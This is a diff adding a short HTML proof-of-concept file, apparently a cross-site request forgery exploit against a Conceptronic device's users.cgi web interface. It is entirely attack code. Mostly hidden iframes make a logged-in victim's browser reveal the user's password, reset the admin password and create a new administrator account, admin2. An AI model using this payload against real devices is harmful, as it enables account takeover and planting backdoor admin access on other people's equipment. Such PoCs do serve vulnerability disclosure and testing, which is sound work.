@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Conceptronic XSRF</title>
+	<style type="text/css">
+		.hidden { visibility: hidden; }
+	</style>
+</head>
+<body>
+	<h1>Conceptronic users.cgi CSRF PoC</h1>
+
+	<!-- Show victims user password in plaintext -->
+	<iframe class="" src="http://<IP>:<PORT>/hy-cgi/user.cgi?cmd=checkuserinfo"></iframe>
+
+	<!-- Change any user password, Admin user always have 10001 userid -->
+	<iframe class="hidden" src="http://<IP>:<PORT>/hy-cgi/user.cgi?cmd=edituser&at_username=admin&at_newpassword=<NEW_PASSWORD>&at_newrolename=admin&at_userid=10001"></iframe>
+
+	<!-- Create new administrator user -->
+	<iframe class="hidden" src="http://<IP>:<PORT>/hy-cgi/user.cgi?cmd=adduser&at_username=admin2&at_password=admin2&at_rolename=admin"></iframe>
+</body>
+</html>
